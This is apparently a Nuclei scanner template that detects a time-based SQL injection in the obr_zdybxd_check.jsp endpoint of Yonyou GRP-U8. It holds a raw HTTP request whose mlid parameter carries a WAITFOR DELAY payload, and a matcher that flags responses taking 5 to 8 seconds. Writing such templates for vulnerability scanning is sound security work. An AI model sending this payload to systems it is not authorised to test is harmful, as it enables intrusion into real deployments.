id: yongyouOA-GRP-U8-obr-zdybxd-check-sql
info:
  name: 用友GRP-U8 obr_zdybxd_check sql注入
  author: cnaq
  severity: high  
  description: 用友GRP-U8 obr_zdybxd_check sql注入
  reference: 
    - https://mp.weixin.qq.com/s/usmVnstRqWdpNOvij4zaPg
  tags: yongyouOA,sql,injection 

requests:
  - raw:
      - | # poc1
        GET /u8qx/obr_zdybxd_check.jsp?mlid=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
        Host: {{Hostname}} 
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1

    matchers:
      - type: dsl # DSL匹配
        dsl:
          - 'duration>=5'
          - 'duration<8' # 漏洞持续时间大于5秒，小于8秒
        condition: and # 将默认的 or 的关系改为 and